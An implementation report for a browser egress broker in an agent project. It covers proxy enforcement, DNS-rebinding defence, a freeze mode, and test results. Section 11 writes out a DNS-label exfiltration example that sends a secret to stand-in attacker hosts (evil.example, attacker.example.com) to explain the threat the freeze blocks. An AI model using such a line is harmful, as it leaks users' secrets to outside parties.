# Milestone 8 S0 — connection-time egress broker

Implementation report. Branch `lumi-agent-v2`.

S0 adds **no user-visible capability**. It replaces a destination policy that
was checked in one place and connected from another with a boundary at the
component that actually opens the socket, so that later slices — authenticated
browsing (M8a) and a network-frozen local form draft (M8b) — have something
under them worth building on.

| | |
|---|---|
| Starting SHA (code) | `a49ebdf61accf3179951352257e12901d0a95f75` (M7b) |
| Starting SHA (docs) | `8a4d294` |
| Architecture review | `docs/plans/milestone-8.md` §6, §18, §23, §26, §27 |
| Final SHA (implementation) | `3726e20bd26c3d1af7bd9fcbe50e5e17f9badc25` |
| Final SHA (documentation) | `cfb694373ca23e032fe3e0241d2248bf5522173d`, then one correction commit finalising this report |

Every result below was measured on `3726e20`. The documentation commits that
follow it change no code.

---

## 1. The spike, and what it decided

**Question.** `PublicNetworkGuard` fetches every intercepted request itself with
`route.fetch(max_redirects=0)`. That fetch is made by Playwright's **Node
driver**, not by Chromium. If the driver went around a proxy the browser was
launched with, the broker would have covered navigation and nothing else, and
the design would have had to change before a line of it was written.

**Method.** A recording loopback proxy, a local origin server, and a real
Chromium, exercising: ordinary `page.goto`; `route.fetch` of a document;
`route.fetch` of a subresource; an HTTPS `CONNECT`; the guard's redirect pattern;
and a control launch with no explicit bypass argument. No external network.

**Result — `route.fetch` traverses the proxy.** Every driver fetch arrived at
the proxy. Two findings came with it, and both shaped the implementation:

1. **The driver sends `CONNECT` for everything it fetches, including plaintext
   `http:` origins.** It never uses absolute form. So for guarded traffic the
   broker sees `host:port` and nothing else — no path, no method, no headers.
   That is not a defect, it is the division of labour: the broker owns the
   destination address, the guard owns everything a tunnel cannot show.
2. **Chromium's own requests use both shapes** — absolute-form `GET` for
   plaintext, `CONNECT` for `https:` — so the broker implements both.

The control launch also showed that Playwright 1.63 already appends
`<-loopback>` to `--proxy-bypass-list` by default. Lumi does not rely on that:
it passes `proxy.bypass = "<-loopback>"` explicitly, which produces exactly one
`--proxy-bypass-list=<-loopback>` on the command line regardless of Playwright's
default and regardless of `PLAYWRIGHT_DISABLE_FORCED_CHROMIUM_PROXIED_LOOPBACK`.

The spike is not a throwaway script. It lives as
`tests/test_egress_broker_browser.py::test_route_fetch_traverses_the_broker`,
because a Playwright upgrade that changed this answer would otherwise hollow out
the boundary silently.

**Gate: passed.** The preferred architecture was implemented. No fallback design
was needed and none was invented.

---

## 2. Broker architecture

`services/agent/app/browser/egress_broker.py`. A loopback HTTP/CONNECT proxy
**inside the browser worker process** — the same trust level as the guard it
sits under, the same lifetime, no extra credential plumbing.

```text
Chromium / Playwright driver
        |  --proxy-server=http://127.0.0.1:<ephemeral>
        |  --proxy-bypass-list=<-loopback>
        v
   EgressBroker            Proxy-Authorization required, including on CONNECT
        |
        +-- frozen?        -> 403 "frozen"        (before the resolver)
        +-- configured local fixture origin? -> dial 127.0.0.1 literally
        +-- port != 443?   -> 403 "port_not_allowed"
        +-- IP literal?    -> 403 "ip_literal"
        +-- shape (PublicUrlPolicy layer 1) -> 403 <policy code>
        |
        v
   resolve once
        |
   every address globally routable?   no -> 403 "non_public_address"
        |                                    (a mixed answer refuses in full)
        v
   open a socket to an address from THAT resolution
```

The dial is the pin. There is one resolution and the socket is opened to a
literal address from it, so there is no second lookup to poison.

The decision function is the only place a destination is approved
(`EgressBroker._decide`), and the connect function will dial nothing that is not
in the `Destination` it was handed (`EgressBroker._connect`).

**Not a general proxy.** Loopback only, ephemeral port, a per-launch
`Proxy-Authorization` credential on every request including `CONNECT`, and
unauthenticated clients get `407` and are counted. It holds no provider key, no
database credential, and nothing about it is exposed to a model, a planner
schema, an observation or an API response.

---

## 3. Process and session ownership

| Property | How |
|---|---|
| Generation identity | `broker.generation`, a UUID minted with the credential and the port |
| Ownership | Created in the worker's FastAPI lifespan, before Chromium launches |
| Readiness handshake | `await broker.start()` returns only after the socket is bound; Chromium is launched with the resulting port. There is no window in which the browser exists and the broker does not |
| Bounded shutdown | `aclose()` closes the listener, cancels every relay, and clears the port |
| Death | The broker dies with the worker process, which on Windows dies with the runtime via the existing kill-on-close job |
| Stale identity | A new launch mints a new credential *and* a new ephemeral port. A credential a replaced worker handed out gets `407` from its successor |

Crash detection is structural rather than a watchdog: if the listener is gone,
Chromium's connections to it fail, which is the correct outcome (§13).

---

## 4. Chromium proxy configuration

`managed_launch_options()` is the single place the managed browser's launch is
described, and a test asserts its contents:

```python
{
  "headless": ...,
  "proxy": {"server": "http://127.0.0.1:<port>",
            "username": ..., "password": ...,
            "bypass": "<-loopback>"},
  "args": ["--disable-quic", "--disable-background-networking"],
}
```

**This is not asserted from the options dictionary alone.** A Windows test reads
the command line of the Chromium process that was actually started
(`Get-CimInstance Win32_Process`) and asserts `--proxy-server=…`,
`--proxy-bypass-list=<-loopback>` (exactly one occurrence, so nothing later can
widen it), `--disable-quic`, and that the proxy password does **not** appear on
a command line every process on the machine can read — Playwright delivers it
over the CDP auth flow instead.

---

## 5. Loopback bypass

Chromium bypasses proxies for loopback **by default**. Without
`<-loopback>` a page reaches `http://127.0.0.1:…` directly and the entire slice
is decorative. This is the single most load-bearing string in S0, and it has
three tests:

* a page's `fetch()` to an unconfigured loopback origin — the canary server
  records **zero connections**, and the broker records the refusal;
* a page navigation to that origin — refused with the broker's own `403` and
  `x-lumi-refusal: plaintext_not_allowed`, canary still at zero;
* the emitted command line, above.

Both fixtures are loopback. Only the broker's own decision separates them, so
the test cannot pass for an accidental reason.

---

## 6. Resolution / dial binding, and IPv4 / IPv6

`resolve_public_addresses()` (new, in `app/domain/public_url.py`) returns the
address list only if **every** address is globally routable, and
`ensure_public_resolution()` is now defined in terms of it, so both layers share
one rule. Refused, by address: loopback, RFC1918, IPv4 link-local including
`169.254.169.254`, carrier-grade NAT, multicast, reserved, IPv6 loopback,
IPv6 unique-local, IPv6 link-local, and IPv4-mapped/6to4/Teredo spellings of any
of them. A **mixed** answer — one public address beside one private — refuses
the host in full, in both address families. That is deliberate: partial
acceptance is exactly the shape a rebinding resolver offers.

Refused by shape, before any lookup: non-`https` public destinations, any port
but 443, IP literals in any spelling, credential-bearing authorities, single
label names, and `localhost`/`.local`/`.internal`/`.test`/`.invalid` and the
rest of the reserved suffix list. The CONNECT authority is validated as a
*string* before it is ever spliced into a URL, so `evil.example/path` cannot be
parsed as the host `evil.example` with the remainder quietly dropped.

Where several public addresses are returned, they are tried in order and each
one attempted is recorded.

---

## 7. HTTPS and TLS

**No interception, no certificate authority, no exception.** A permitted
`CONNECT` is answered `200 Connection Established` and then spliced byte for
byte. The broker holds no certificate and no key; a test greps its source for
`ssl.SSLContext`, `wrap_socket`, `load_cert_chain` and `CERT_NONE` and fails if
any appears.

Consequences, all intended: SNI carries the original hostname; Chromium
validates the certificate against that hostname; HSTS, certificate
transparency and pinning behave exactly as they would without a proxy; a
certificate error stays an error. No test anywhere in this slice sets
`ignore_https_errors` or `--ignore-certificate-errors`, which is why the HTTPS
tests use a name that cannot resolve (`.invalid`) rather than a self-signed
fixture.

HTTP/2 is negotiated end to end inside the tunnel via ALPN and is unaffected;
the broker is below it.

---

## 8. Redirects

M7b's per-hop policy is unchanged and still owned by the guard, which is the
only layer that can see a `Location` header at all. The browser still never
follows a redirect.

| Case | Result |
|---|---|
| public → public, in scope | the guard defers, hands the target back, and the operation re-validates and navigates. The target is fetched only after that second check |
| public → unconfigured origin | refused; the destination server records **zero connections** |
| public → private / loopback / metadata | refused twice over: the guard's URL check, and the broker's address check at connect time |
| chain | every hop is a fresh request through both layers; the existing redirect upper bound is untouched |

---

## 9. QUIC, WebSocket, service workers, and the other escape paths

| Transport | Position |
|---|---|
| HTTP | brokered (absolute form) |
| HTTPS / CONNECT | brokered (tunnel) |
| HTTP/2 | inside the tunnel, brokered at the connection |
| HTTP/3 / QUIC | `--disable-quic`, asserted on the real command line. Chromium also cannot carry QUIC to an origin through an HTTP proxy |
| IPv4 / IPv6 | both resolved and checked; literals refused |
| WebSocket | **still blocked by the guard**, not by the broker. `wss:` and `https:` are the same `CONNECT`, so the broker cannot tell them apart. Stated as a limitation, not claimed as a guarantee |
| Service workers | still `service_workers="block"` on every public/research context. Not relaxed |
| Downloads | still `accept_downloads=False`; attachments still refused by the guard |
| Popups | still closed by the guard; a popup that is briefly adopted still has every request brokered |
| Browser-internal schemes, `file:`, `data:`, `javascript:`, custom protocol handlers | refused by URL shape; they never become a proxy request in the first place |
| DNS | Chromium does not resolve proxied origins itself. Proven, not cited: a navigation to a name that cannot resolve fails at the tunnel with the broker's refusal counter incremented and **not** with `ERR_NAME_NOT_RESOLVED` |

Nothing that M7b blocked at a higher layer was deleted. The broker is defence in
depth plus connection-time address enforcement.

---

## 10. Broker death, and failing closed

If the broker goes away, Chromium has no route. Three tests:

* with no route handler, a navigation that previously succeeded now fails and
  the fixture's connection count **does not move**;
* with the guard installed, the guard's own `route.fetch` fails
  (`fetch_failed`) and the fixture's count does not move;
* a client connecting to the broker's former port gets a socket error.

There is no direct-connection fallback anywhere in the design, because there is
nowhere one could be configured: the browser was launched with the proxy.

---

## 11. The freeze primitive (for M8b — not M8b itself)

`BrokerMode.FROZEN`, set by `broker.freeze()`, refuses every new connection
**before calling the resolver**. This is why the broker had to exist before
M8b rather than alongside it: a route handler that aborts requests cannot stop a
DNS lookup, and `fetch('https://' + secret + '.evil.example/')` tells an
attacker the secret whether or not the connection ever succeeds.

Two tests, at both levels:

```text
broker mode = FROZEN
browser requests https://secret-value.attacker.example.com/

upstream resolver query count == 0
broker resolution counter       unchanged
destination connection count    == 0
request refused with code "frozen"
```

`freeze()` returns the number of connections still being relayed. M8b will have
to drive that to zero before it may claim nothing was in flight; S0 provides the
number and makes no such claim itself. **No form preparation, no freeze state
machine, no UI and no user-visible mode was built.**

---

## 12. The `_resolutions` cache

The M7b guard cached a host's resolution **verdict** for the lifetime of the
context. A successful resolution was therefore reused for every later request to
that host, while the connection was made afresh each time — an amplifier on the
documented rebinding gap, and one the documentation did not mention.

Now that the broker is authoritative for the destination address, the guard's
resolution is defence in depth, and it must not look stronger than it is:

* **success caching removed.** Every request re-checks.
* **refusal caching kept.** A host that resolved to a private address does not
  get a fresh chance on every subresource. It remains correct and useful.

The field is renamed `_refusals` so the code says what it does.

---

## 13. M7b integration

The broker is wired in one place — the worker lifespan, which starts it and
launches Chromium through it. Every context in the worker inherits the proxy,
so research, inspection and booking are all brokered without any of them
knowing.

Unchanged, as required: the planner schema, the research operation vocabulary,
grants, step authorizations, the observation schema, research budgets, answer
grounding and composer routing. No migration. No new environment variable. No
new API route. `public_search`, `navigate`, `observe`, `scroll`, `history` and
`tab` all still work — the M7b browser suite passes unmodified.

---

## 14. M7a behaviour

M7a keeps its trusted host allowlist exactly as it was; `public-url-v1` is
untouched. It also gains the broker for free, because there is one browser and
it is launched through the proxy. That was the cheap option, not a widening of
the slice: it required no code in the M7a path.

---

## 15. The search primitive

`public_search` is a runtime-side JSON `GET` made with `httpx`, to an endpoint
that comes from **trusted configuration** — never from a page, a model or a
planner. It does not go through the broker and is not browser traffic.

Its guarantee is stated separately rather than folded in: shape-checked and
resolution-checked in the runtime before the request, no redirects followed,
bounded status, content type and size. It is **not** connection-pinned, so a
rebinding resolver could in principle race it. The exposure is much narrower
than research browsing — one configured host, no page-controlled destination —
and it is written down rather than papered over.

"All of Lumi's network traffic is brokered" would be false. "The managed
browser's connections are" is true, and that is the claim made.

---

## 16. Deterministic test results

New: `tests/test_egress_broker.py` (**48 passed**) and
`tests/test_egress_broker_browser.py` (**12 passed**, real Chromium, marker
`browser`).

| # | Required | Where | Result |
|---|---|---|---|
| 1 | Ordinary navigation traverses the broker | `test_ordinary_navigation_traverses_the_broker` | pass |
| 2 | `route.fetch` behaviour explicitly proven | `test_route_fetch_traverses_the_broker` | pass — traverses, as `CONNECT` |
| 3 | Subresources traverse the broker | asserted in both of the above (`/sub.js`) | pass |
| 4 | HTTPS CONNECT path | `test_https_arrives_as_a_connect_and_is_judged_there`, `test_a_permitted_host_is_dialled_at_the_address_that_was_checked` | pass |
| 5 | Loopback default-bypass neutralised | `test_chromium_cannot_reach_an_unconfigured_loopback_origin`, `test_a_page_cannot_navigate_to_an_unconfigured_loopback_origin`, `test_the_emitted_chromium_command_line_carries_the_boundary` | pass |
| 6 | Private IPv4 blocked | `test_non_public_answers_are_refused_and_never_contacted[10.0.0.5]` | pass |
| 7 | Loopback blocked | same test `[127.0.0.1]`; `test_refused_before_any_name_is_looked_up[CONNECT 127.0.0.1:443]` | pass |
| 8 | IPv6 private / link-local / loopback blocked | same test `[::1]`, `[fd00::1]`, `[fe80::1]`, and the CONNECT-literal cases | pass |
| 9 | Metadata target blocked | same test `[169.254.169.254]`; `CONNECT metadata.google.internal:443` | pass |
| 10 | DNS rebind public → private blocked | `test_dns_rebinding_cannot_move_a_later_connection_to_a_private_address`, `test_alternating_answers_are_judged_one_connection_at_a_time` | pass |
| 11 | Mixed public/private answer refused | `test_a_mixed_answer_refuses_the_whole_host`, `test_a_public_answer_beside_a_v6_private_one_is_refused` | pass |
| 12 | Redirect public → private never contacts target | `test_a_redirect_to_an_unconfigured_origin_never_contacts_it` | pass |
| 13 | Redirect public → public works | `test_a_redirect_within_the_site_is_handed_back_for_revalidation` | pass |
| 14 | WebSocket blocked or covered | `test_websockets_remain_blocked_above_the_broker` | pass (guard-level, as stated) |
| 15 | QUIC / direct transport tested or disabled | `test_the_emitted_chromium_command_line_carries_the_boundary` | pass |
| 16 | Broker crash means no direct fallback | `test_a_dead_broker_does_not_fall_back_to_direct_networking`, `test_a_dead_broker_also_stops_the_guards_own_fetches`, `test_a_closed_broker_accepts_nothing` | pass |
| 17 | Stale broker generation not reused | `test_a_credential_from_another_broker_generation_is_refused` | pass |
| 18 | Frozen broker produces no upstream DNS query | `test_frozen_refuses_without_performing_an_upstream_dns_lookup`, `test_a_frozen_broker_stops_browser_traffic_without_resolving` | pass |
| 19 | M7b multi-hop research still succeeds | `tests/test_research_browser.py` | 43 passed |
| 20 | M7b hostile / stale / budget / recovery suites unchanged | `test_research_authorization.py`, `test_research_ledger.py`, `test_research_domain.py` | pass, unmodified |
| 21 | M7a regression | `tests/test_public_page_worker.py`, `tests/test_network_guard_methods.py` | 39 passed (38 before S0 added the resolution-cache test) |
| 22 | Booking regression | `tests/test_browser_booking.py` | 27 passed |

Also covered, beyond the required list: unauthenticated clients get `407`
without a lookup; DNS failure refuses rather than guesses; several public
addresses are tried in order; a configured origin must be loopback or the broker
refuses to start; diagnostics carry the refusal code, transport and generation
but never the host, the credential or a header.

Every fixture is local. No external site is required for security acceptance.

### Repository checks

| Check | Result |
|---|---|
| `npm.cmd run typecheck` | pass |
| `npm.cmd run build` | pass |
| `npm.cmd test` | **1956 passed, 1 failed, 22 skipped** (3 failed files) — the three known environment baselines, unchanged |
| `uv run pytest` | **828 passed, 16 skipped**, exit 0 (M7b baseline: 765 passed, 16 skipped) |
| `uv run mypy` | pass, 125 source files |
| `npm.cmd run eval` | **118/118** deterministic eval cases |
| Electron acceptance (`LUMI_ELECTRON_E2E=1`) | **15/15**, one file at a time: `test_electron_acceptance` 2, `test_voice_acceptance` 3, `test_m6_acceptance` 5, `test_inspection_acceptance` 5 |

As in M7b, the Python runs set `LUMI_PUBLIC_INSPECTION_HOSTS=""` (without it the
developer `.env` leaks into `test_booking_preparation.py`, a pre-existing
interaction reproducible on the M7b base commit), and the Electron acceptance
files are run **one file at a time** — running all four in one pytest process on
this machine trips the 60-second renderer launch deadline. Neither is new, and
neither is caused by S0. Nothing was ever run concurrently against
`lumi_agent_test`.

**Known environment baseline, unrelated to S0 and identical on a clean tree:**
`src/main/vision/real-inference.test.ts` and
`src/main/vision/tokenizer-pack.test.ts` fail to collect (vision model assets
are not present in this environment) and
`src/renderer/src/accessibility.test.tsx` has one failing style assertion.
Verified by stashing the S0 changes and re-running: 3 files / 1 test fail either
way.

---

## 17. Real-web smoke

`uv run python -m scripts.research_smoke` — the same opt-in, read-only M7b
script, unchanged, now with every connection carried by the broker. One session,
three addresses, one reused tab.

| Address | Result |
|---|---|
| `github.com/satish9177/Lumi` | **OK.** Epoch 5, 120 blocks (6,807 chars, truncated), 25 of 125 links. Title and README text read. |
| `docs.python.org/3/library/asyncio-task.html` | **OK.** Epoch 7, 120 blocks (3,030 chars), 25 of 31 links. |
| `leetcode.com/problems/two-sum/` | **HTTP 403**, `page_http_error`, `FAILED_BEFORE_EFFECT`. Re-observing the tab showed the Cloudflare interstitial ("Performing security verification", Ray ID printed by the page). Epoch 10. |

Identical to the M7b record in every field, including the epoch progression
5 → 7 → 10, so the broker changed the path the bytes take and nothing a task
sees. The LeetCode 403 is reported as the site answered it; **no bypass was
attempted, and none exists** — no CAPTCHA solver, no stealth mode, no attempt to
look like a human browser.

**Whether each connection was brokered.** Structurally, yes, and it is not an
inference: the browser is launched with `--proxy-server` and
`--proxy-bypass-list=<-loopback>`, which is asserted against the real Chromium
process command line, and the deterministic suite shows that a destination the
broker refuses is never contacted. Three pages loading at all is therefore three
pages loaded through the broker.

**The optional per-address probe was not obtained.** A scratch script was written
to print the broker's own counters — the literal addresses dialled per host — for
these same three URLs. It ran for over ten minutes with its stdout file-buffered,
produced no usable output, and was terminated. No orphaned broker, Chromium, `uv`
or `node` process remained. It was optional, it is not part of S0 acceptance, and
nothing in this report depends on it: the dial-address binding is proven
deterministically in `tests/test_egress_broker.py`, where the address asked for
is asserted directly and the forbidden endpoint's connection count is asserted to
be zero.

**R, and it belongs here:** a real-site run demonstrates *usability*, never
*enforcement*. Lumi cannot see a real server's counters. Every security claim in
this report rests on the local deterministic fixtures, not on these three pages.

---

## 18. Packaging

**No packaging change was needed, and none was made.** The broker is Python, it
binds an ephemeral loopback port at worker start, and it requires no new binary,
no certificate store entry and no configuration.

It was verified on the binary the bundle actually ships: for `headless=True`,
Playwright 1.63 launches `chrome-headless-shell.exe` from
`chromium_headless_shell-1243`, which is what `build-agent-runtime.mjs` copies.

**M8a prerequisite, recorded and not acted on:** `scripts/build-agent-runtime.mjs`
bundles only `chromium-headless-shell`. Manual sign-in needs a visible window, so
full Chromium must be bundled before M8a ships (roughly +150–200 MB against a
~263 MB installer; measure before committing), and the headless shell should be
dropped rather than shipping two browser builds. Written into
`docs/PACKAGING.md`.

**Authenticode:** unchanged by S0 and still a release gate for M8a. M7b's
packaged acceptance substituted the stock Electron executable to get past Smart
App Control, which disables asar integrity validation. That workaround is not
acceptable for a build that will hold real session cookies. **M8a is not
production-ready until the build is signed**, independent of anything in this
slice.

---

## 19. Residual limitations

### Covered

* Managed Chromium's connections — navigation, subresources, and the network
  guard's own `route.fetch` — all go through the broker.
* Destination address validated at the component that dials.
* DNS rebinding, for brokered connections: one resolution, and the socket is
  opened to an address from it.
* Private, loopback, link-local, unique-local, multicast, reserved and cloud
  metadata destinations are refused, and the tests assert the target server
  recorded no connection.
* Plaintext HTTP only to exactly-configured loopback fixture origins; public
  destinations are `https:` on 443 or nothing.
* Broker death fails closed, with no direct-connection fallback.
* Per-hop redirect policy retained; a refused redirect never contacts its
  target.
* A freeze mode that refuses without an upstream DNS lookup.

### Not covered

* **Arbitrary native code in the worker process.** The broker constrains
  Chromium; it does not constrain its own host. A compromised worker opens
  whatever socket it likes. Process separation is not privilege isolation, and
  S0 is a network-policy boundary, not an OS sandbox.
* **Runtime-side traffic.** `public_search`, provider calls and the database
  connection are not brokered.
* **OS processes outside Chromium.** Out of scope entirely.
* **DNS-name exfiltration outside freeze.** The broker resolves, so a hostile
  page can still signal data through a DNS label. Relocating resolution moved
  this channel; it did not remove it. Only the freeze closes it, and closing it
  in general would need a hostname allowlist, which research cannot have.
* **`wss:` at the broker.** Indistinguishable from `https:` at a `CONNECT`.
  WebSocket blocking remains a Playwright-level control.
* **Scope.** The broker does not decide *which* public host a task may read; a
  tunnel carries no path. That stays with the grant and the guard.
* **A legitimate public destination receiving data.** Nothing here prevents
  that, and nothing should.
* **Unsupported Chromium transports.** Claims are made for what is tested or
  disabled, and for nothing else.

---

## 20. Documentation corrections

* `docs/reviews/milestone-7b.md` §11 and §17 — the DNS wording is corrected. The
  M7b implementation did **not** perform a fresh application-level DNS check
  before every request: `PublicNetworkGuard` cached a host's resolution verdict
  for the lifetime of the context, so a successful resolution was reused for
  later requests to that host. Stated plainly, with the fix named.
* `docs/PUBLIC-RESEARCH.md` — a new "egress broker" section; the "not a network
  sandbox" bullet rewritten to say what the broker does and does not close, and
  an explicit note that search is not brokered.
* `docs/SECURITY.md` — a new "Egress broker" section and four honest new entries
  under "Known gaps".
* `docs/PACKAGING.md` — no packaging change for S0; full Chromium recorded as an
  M8a prerequisite.

The phrase "network sandbox" is still not used for what Lumi has, because Lumi
still does not have one.

---

## 21. What was not built

Explicitly **not** started, not stubbed and not partially implemented:

* **M8a** — no `browser_profiles` table, no persistent context, no profile path,
  no lease, no manual login, no takeover state machine, no headed window, no
  credential-surface detector, no account fingerprint, no authenticated
  reading, no disclosure model.
* **M8b** — no form preparation, no element refs, no form epochs, no
  `protected_values`, no manifest approval, no field writes, no dirtiness
  tracking, no handover. `BrokerMode.FROZEN` is a broker primitive with broker
  tests; there is no preparation state, no UI and no user-facing mode.
* **M9, M10** — untouched.
* No new user grant, permission card, IPC channel, planner field, operation or
  migration was added anywhere in this slice.
